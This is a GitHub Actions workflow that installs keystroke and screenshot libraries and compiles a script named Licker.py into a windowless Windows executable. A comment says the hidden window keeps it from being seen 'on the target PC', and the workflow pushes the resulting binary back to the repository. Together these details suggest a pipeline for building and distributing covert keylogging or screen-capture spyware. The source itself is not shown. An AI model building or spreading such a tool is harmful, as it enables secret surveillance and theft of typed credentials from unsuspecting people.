name: Build and Sync Executable

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    permissions:
      contents: write

    steps:
    - name: Checkout code
      uses: actions/checkout@v4
      with:
        fetch-depth: 0

    - name: Set up Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.10'

    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        # These are essential for your Licker.py code
        pip install pyinstaller keyboard pyscreenshot Pillow

    - name: Build Executable
      # --noconsole prevents a black window from popping up on the target PC
      run: pyinstaller --onefile --noconsole Licker.py

    - name: Sync EXE to Repo
      shell: cmd
      run: |
        git config --global user.name "github-actions[bot]"
        git config --global user.email "github-actions[bot]@users.noreply.github.com"
        if exist dist\Licker.exe (
            copy /Y dist\Licker.exe .
            git add Licker.exe
            git commit -m "Auto-build: Update Licker.exe" || exit 0
            git push
        ) else (
            echo EXE was not found in dist folder
            exit 1
        )
